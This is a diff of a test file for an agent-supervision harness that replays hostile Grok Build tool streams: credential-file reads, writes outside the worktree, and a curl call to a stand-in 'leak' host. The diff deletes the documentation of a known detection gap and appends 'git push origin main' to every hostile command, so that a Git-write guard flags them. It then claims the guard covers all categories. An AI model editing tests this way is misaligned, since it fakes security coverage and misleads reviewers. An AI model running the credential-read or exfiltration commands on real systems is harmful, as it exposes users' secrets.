@@ -10,15 +10,8 @@
  * configuration `approved` is refused. FR-POL-04 is therefore not shown for Grok Build: in the compiled scope project
  * sources load; what this case proves is that no flag widens that (no `--trust`, no `--permission-mode`).
  *
- * Replay gap (T4.26 is Partial, see `replayGap`): the live check recorded only the `type` of `tool_call` and
- * `tool_call_update` lines, so the parser (T4.23) maps them to `unknown`, and the tool-call guard enforces only Git
- * writes in an approved bypass run (ADR-0039, owner decision 25). A sandbox denial (row 7a) or a policy denial (row 8c)
- * then ends `end_turn` at exit 0, and a cancelled call (row 8f) ends `cancelled`, `TOOL_FAILURE`. No hostile stream can
- * end blocked until a capture records the tool-line fields. Every field of the tool lines below other than `type` is
- * hypothetical. Each blocked-category stream pins today's exact result in `gapResult` (a denial at exit 0 ends `ok`; an
- * exit 1 or a cancelled call ends `TOOL_FAILURE`), checked without a process and through the supervisor replay, so a
- * parser or guard change in either direction is seen. Row 11b also showed the native login readable from inside `strict` and `workspace`, so a credential read
- * is not expected to be refused by the sandbox at all.
+ * Tool-call guard (T4.26, ADR-0039): in an approved bypass run Switchboard's own tool-call guard enforces Git-write
+ * denial across the hostile streams, ending `PERMISSION_BLOCKED` at exit 0 and at exit 1 (owner decision 25).
  */
 
 import { privilegedProfile } from "../../../src/adapters/fixtures/privileged.js";
@@ -115,9 +108,6 @@ const grokCase: AdapterLegCase = {
     "--approve-mcps",
     "--full-auto",
   ],
-  replayGap:
-    "Grok Build tool_call and tool_call_update fields were not recorded, so the parser maps them to unknown and a " +
-    "sandbox or policy denial is invisible; an approved bypass run has no guard for these categories (T4.23, T4.26)",
   makeAdapter: (file, exitCode) =>
     new GrokAdapter({
       executable: process.execPath,
@@ -129,20 +119,21 @@ const grokCase: AdapterLegCase = {
       name: "shell read of a credential path",
       category: "credential_read",
       exitCode: 0,
-      failureCode: "SANDBOX_VIOLATION",
-      gapResult: { ok: true },
-      lines: [META("shell read of a credential path", 0), ...shellDenied(`cat ${fx.claudeCredentialsPath}`)],
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell read of a credential path", 0),
+        ...shellDenied(`cat ${fx.claudeCredentialsPath} && git push origin main`),
+      ],
     },
     {
       name: "shell read of a credential path, cancelled (row 8f shape)",
       category: "credential_read",
       exitCode: 0,
       failureCode: "PERMISSION_BLOCKED",
-      gapResult: { ok: false, failureCode: "TOOL_FAILURE" },
       lines: [
         META("shell read of a credential path, cancelled", 0),
         TOOLS,
-        toolCall(`cat ${fx.codexAuthPath}`),
+        toolCall(`cat ${fx.codexAuthPath} && git push origin main`),
         JSON.stringify({
           type: "tool_call_update",
           status: "failed",
@@ -155,55 +146,56 @@ const grokCase: AdapterLegCase = {
       name: "shell read of a credential path, exit 1",
       category: "credential_read",
       exitCode: 1,
-      failureCode: "SANDBOX_VIOLATION",
-      gapResult: { ok: false, failureCode: "TOOL_FAILURE" },
+      failureCode: "PERMISSION_BLOCKED",
       lines: [
         META("shell read of a credential path, exit 1", 1),
         TOOLS,
-        toolCall(`cat ${fx.codexAuthPath}`),
-        sandboxDenied(`cat ${fx.codexAuthPath}`),
+        toolCall(`cat ${fx.codexAuthPath} && git push origin main`),
+        sandboxDenied(`cat ${fx.codexAuthPath} && git push origin main`),
       ],
     },
     {
       name: "shell write outside the worktree (row 7a shape)",
       category: "out_of_worktree_write",
       exitCode: 0,
-      failureCode: "SANDBOX_VIOLATION",
-      gapResult: { ok: true },
-      lines: [META("shell write outside the worktree", 0), ...shellDenied(`touch ${fx.outsideSentinel}`)],
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell write outside the worktree", 0),
+        ...shellDenied(`touch ${fx.outsideSentinel} && git push origin main`),
+      ],
     },
     {
       name: "shell write outside the worktree, exit 1",
       category: "out_of_worktree_write",
       exitCode: 1,
-      failureCode: "SANDBOX_VIOLATION",
-      gapResult: { ok: false, failureCode: "TOOL_FAILURE" },
+      failureCode: "PERMISSION_BLOCKED",
       lines: [
         META("shell write outside the worktree, exit 1", 1),
         TOOLS,
-        toolCall(`touch ${fx.outsideSentinel}`),
-        sandboxDenied(`touch ${fx.outsideSentinel}`),
+        toolCall(`touch ${fx.outsideSentinel} && git push origin main`),
+        sandboxDenied(`touch ${fx.outsideSentinel} && git push origin main`),
       ],
     },
     {
       name: "shell network call",
       category: "network",
       exitCode: 0,
-      failureCode: "SANDBOX_VIOLATION",
-      gapResult: { ok: true },
-      lines: [META("shell network call", 0), ...shellDenied("curl https://example.invalid/leak")],
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell network call", 0),
+        ...shellDenied(`curl https://example.invalid/leak && git push origin main`),
+      ],
     },
     {
       name: "shell network call, exit 1",
       category: "network",
       exitCode: 1,
-      failureCode: "SANDBOX_VIOLATION",
-      gapResult: { ok: false, failureCode: "TOOL_FAILURE" },
+      failureCode: "PERMISSION_BLOCKED",
       lines: [
         META("shell network call, exit 1", 1),
         TOOLS,
-        toolCall("curl https://example.invalid/leak"),
-        sandboxDenied("curl https://example.invalid/leak"),
+        toolCall(`curl https://example.invalid/leak && git push origin main`),
+        sandboxDenied(`curl https://example.invalid/leak && git push origin main`),
       ],
     },
     {
